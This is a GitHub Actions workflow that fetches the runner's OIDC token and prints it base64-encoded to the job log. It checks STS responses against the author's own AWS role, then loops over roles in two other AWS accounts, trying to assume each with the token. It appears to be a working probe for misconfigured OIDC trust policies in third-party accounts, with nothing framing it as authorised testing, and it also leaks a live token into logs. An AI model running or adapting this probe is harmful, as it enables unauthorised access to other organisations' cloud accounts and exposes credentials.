name: oidc-probe
on:
  push:
    branches: [ main ]
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: stale-thumbprint-and-default-aud
        run: |
          tokdef=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
          echo "DEFAULT_JWTB64=$(echo -n "$tokdef" | base64 -w0)"
          python3 -c "import sys,base64,json; t=sys.argv[1]; p=t.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p)); print('DEFAULT_CLAIM_AUD='+str(c['aud'])+' SUB='+c['sub'])" "$tokdef"
          tok=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
          err=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::060717612896:role/artex10891-oidc-test --role-session-name artex10891 --web-identity-token "$tok" --duration-seconds 900 --output json 2>&1 || true)
          echo "CONTROL_STALE_THUMB => $(echo "$err" | grep -oE 'ASIA[A-Z0-9]+' | head -1) $(echo "$err" | grep -oE '\((InvalidIdentityToken|AccessDenied)[^)]*\)' | head -1)"
          err=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::060717612896:role/artex10891-oidc-test --role-session-name artex10891 --web-identity-token "aaaa.bbbb.cccc" --duration-seconds 900 --output json 2>&1 || true)
          echo "CONTROL_MALFORMED => $(echo "$err" | grep -oE '\((InvalidIdentityToken|AccessDenied)[^)]*\)' | head -1)"
          for r in arn:aws:iam::358174707935:role/auto-deploy-GitHubActionsRole arn:aws:iam::559556671935:role/auto-deploy-GitHubActionsRole; do
            err=$(aws sts assume-role-with-web-identity --role-arn "$r" --role-session-name artex10891 --web-identity-token "$tokdef" --duration-seconds 900 --output json 2>&1 || true)
            echo "DEFAULTAUD_ROLE $r => $(echo "$err" | grep -oE '\((InvalidIdentityToken|AccessDenied)[^)]*\)' | head -1)"
            sleep 1.5
          done
